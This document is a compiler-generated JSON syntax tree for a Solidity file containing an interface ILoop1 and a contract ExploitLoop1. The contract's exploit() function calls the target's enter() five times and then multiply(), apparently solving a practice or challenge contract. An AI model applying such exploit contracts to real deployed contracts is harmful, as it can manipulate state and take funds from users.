JSON AST (compact format):


======= contract.sol =======
{"absolutePath":"contract.sol","exportedSymbols":{"ExploitLoop1":[49],"ILoop1":[7]},"id":50,"nodeType":"SourceUnit","nodes":[{"abstract":false,"baseContracts":[],"canonicalName":"ILoop1","contractDependencies":[],"contractKind":"interface","fullyImplemented":false,"id":7,"linearizedBaseContracts":[7],"name":"ILoop1","nameLocation":"10:6:0","nodeType":"ContractDefinition","nodes":[{"functionSelector":"f3593cd0","id":3,"implemented":false,"kind":"function","modifiers":[],"name":"multiply","nameLocation":"32:8:0","nodeType":"FunctionDefinition","parameters":{"id":1,"nodeType":"ParameterList","parameters":[],"src":"40:2:0"},"returnParameters":{"id":2,"nodeType":"ParameterList","parameters":[],"src":"51:0:0"},"scope":7,"src":"23:29:0","stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"functionSelector":"e97dcb62","id":6,"implemented":false,"kind":"function","modifiers":[],"name":"enter","nameLocation":"66:5:0","nodeType":"FunctionDefinition","parameters":{"id":4,"nodeType":"ParameterList","parameters":[],"src":"71:2:0"},"returnParameters":{"id":5,"nodeType":"ParameterList","parameters":[],"src":"82:0:0"},"scope":7,"src":"57:26:0","stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"scope":50,"src":"0:85:0","usedErrors":[]},{"abstract":false,"baseContracts":[],"canonicalName":"ExploitLoop1","contractDependencies":[],"contractKind":"contract","fullyImplemented":true,"id":49,"linearizedBaseContracts":[49],"name":"ExploitLoop1","nameLocation":"96:12:0","nodeType":"ContractDefinition","nodes":[{"constant":false,"functionSelector":"78efd7fd","id":10,"mutability":"mutable","name":"loop1Contract","nameLocation":"129:13:0","nodeType":"VariableDeclaration","scope":49,"src":"115:27:0","stateVariable":true,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_contract$_ILoop1_$7","typeString":"contract ILoop1"},"typeName":{"id":9,"nodeType":"UserDefinedTypeName","pathNode":{"id":8,"name":"ILoop1","nameLocations":["115:6:0"],"nodeType":"IdentifierPath","referencedDeclaration":7,"src":"115:6:0"},"referencedDeclaration":7,"src":"115:6:0","typeDescriptions":{"typeIdentifier":"t_contract$_ILoop1_$7","typeString":"contract ILoop1"}},"visibility":"public"},{"body":{"id":21,"nodeType":"Block","src":"184:54:0","statements":[{"expression":{"id":19,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":15,"name":"loop1Contract","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":10,"src":"194:13:0","typeDescriptions":{"typeIdentifier":"t_contract$_ILoop1_$7","typeString":"contract ILoop1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"arguments":[{"id":17,"name":"_loop1Address","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":12,"src":"217:13:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":16,"name":"ILoop1","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":7,"src":"210:6:0","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_ILoop1_$7_$","typeString":"type(contract ILoop1)"}},"id":18,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"210:21:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_contract$_ILoop1_$7","typeString":"contract ILoop1"}},"src":"194:37:0","typeDescriptions":{"typeIdentifier":"t_contract$_ILoop1_$7","typeString":"contract ILoop1"}},"id":20,"nodeType":"ExpressionStatement","src":"194:37:0"}]},"id":22,"implemented":true,"kind":"constructor","modifiers":[],"name":"","nameLocation":"-1:-1:-1","nodeType":"FunctionDefinition","parameters":{"id":13,"nodeType":"ParameterList","parameters":[{"constant":false,"id":12,"mutability":"mutable","name":"_loop1Address","nameLocation":"169:13:0","nodeType":"VariableDeclaration","scope":22,"src":"161:21:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":11,"name":"address","nodeType":"ElementaryTypeName","src":"161:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"160:23:0"},"returnParameters":{"id":14,"nodeType":"ParameterList","parameters":[],"src":"184:0:0"},"scope":49,"src":"149:89:0","stateMutability":"nonpayable","virtual":false,"visibility":"public"},{"body":{"id":47,"nodeType":"Block","src":"270:125:0","statements":[{"body":{"id":40,"nodeType":"Block","src":"309:46:0","statements":[{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":35,"name":"loop1Contract","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":10,"src":"323:13:0","typeDescriptions":{"typeIdentifier":"t_contract$_ILoop1_$7","typeString":"contract ILoop1"}},"id":37,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"337:5:0","memberName":"enter","nodeType":"MemberAccess","referencedDeclaration":6,"src":"323:19:0","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":38,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"323:21:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":39,"nodeType":"ExpressionStatement","src":"323:21:0"}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":31,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":29,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":26,"src":"297:1:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"hexValue":"35","id":30,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"301:1:0","typeDescriptions":{"typeIdentifier":"t_rational_5_by_1","typeString":"int_const 5"},"value":"5"},"src":"297:5:0","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":41,"initializationExpression":{"assignments":[26],"declarations":[{"constant":false,"id":26,"mutability":"mutable","name":"i","nameLocation":"290:1:0","nodeType":"VariableDeclaration","scope":41,"src":"285:6:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":25,"name":"uint","nodeType":"ElementaryTypeName","src":"285:4:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":28,"initialValue":{"hexValue":"30","id":27,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"294:1:0","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"285:10:0"},"loopExpression":{"expression":{"id":33,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":false,"src":"304:3:0","subExpression":{"id":32,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":26,"src":"304:1:0","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":34,"nodeType":"ExpressionStatement","src":"304:3:0"},"nodeType":"ForStatement","src":"280:75:0"},{"expression":{"arguments":[],"expression":{"argumentTypes":[],"expression":{"id":42,"name":"loop1Contract","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":10,"src":"364:13:0","typeDescriptions":{"typeIdentifier":"t_contract$_ILoop1_$7","typeString":"contract ILoop1"}},"id":44,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"378:8:0","memberName":"multiply","nodeType":"MemberAccess","referencedDeclaration":3,"src":"364:22:0","typeDescriptions":{"typeIdentifier":"t_function_external_nonpayable$__$returns$__$","typeString":"function () external"}},"id":45,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"364:24:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":46,"nodeType":"ExpressionStatement","src":"364:24:0"}]},"functionSelector":"63d9b770","id":48,"implemented":true,"kind":"function","modifiers":[],"name":"exploit","nameLocation":"253:7:0","nodeType":"FunctionDefinition","parameters":{"id":23,"nodeType":"ParameterList","parameters":[],"src":"260:2:0"},"returnParameters":{"id":24,"nodeType":"ParameterList","parameters":[],"src":"270:0:0"},"scope":49,"src":"244:151:0","stateMutability":"nonpayable","virtual":false,"visibility":"public"}],"scope":50,"src":"87:310:0","usedErrors":[]}],"src":"0:418:0"}